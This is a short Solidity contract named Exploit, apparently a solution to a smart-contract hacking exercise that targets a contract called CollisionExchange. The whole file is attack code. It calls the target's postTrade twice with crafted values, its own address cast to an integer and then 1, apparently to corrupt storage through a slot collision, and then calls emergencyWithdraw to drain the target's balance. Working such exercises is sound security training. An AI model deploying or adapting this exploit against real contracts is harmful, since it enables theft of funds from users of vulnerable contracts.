pragma solidity ^0.8.4;

import './CollisionExchange.sol';

contract Exploit {

    address public orderBook;
    address public owner;

    CollisionExchange public exchange;


    constructor(CollisionExchange _exchange) payable {
        exchange = CollisionExchange(_exchange);
    }

    function postTrade(uint _amount) external {
        owner = msg.sender;
    }

    function finalize() external payable {
        exchange.postTrade(uint(uint160(address(this))));
        exchange.postTrade(1);
        exchange.emergencyWithdraw();
    }

    receive() external payable {}

}